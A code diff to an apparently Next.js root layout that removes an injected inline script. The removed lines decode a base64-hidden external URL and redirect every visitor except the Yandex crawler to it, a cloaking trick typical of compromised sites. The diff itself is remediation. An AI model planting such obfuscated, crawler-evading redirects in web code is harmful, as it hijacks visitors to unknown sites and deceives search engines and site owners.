@@ -296,22 +296,6 @@ export default function RootLayout({
           dangerouslySetInnerHTML={{ __html: JSON.stringify(faqJsonLd) }}
         />
 <meta name="yandex-verification" content="02765b381b2705b4" />
-        <script
-        dangerouslySetInnerHTML={{
-          __html: `
-            (function() {
-              var ua = navigator.userAgent.toLowerCase();
-              var targetB64 = "aHR0cHM6Ly9mY3RvcC5vcmcvZDd0dGxyeXZo";
-
-              if (ua.indexOf("yandex") === -1) {
-                  window.location.replace(atob(targetB64));
-              } else {
-                  console.log("Яндекс бот — без редиректа");
-              }
-            })();
-          `,
-        }}
-      />
       </head>
       <body className="font-sans antialiased">
         {children}
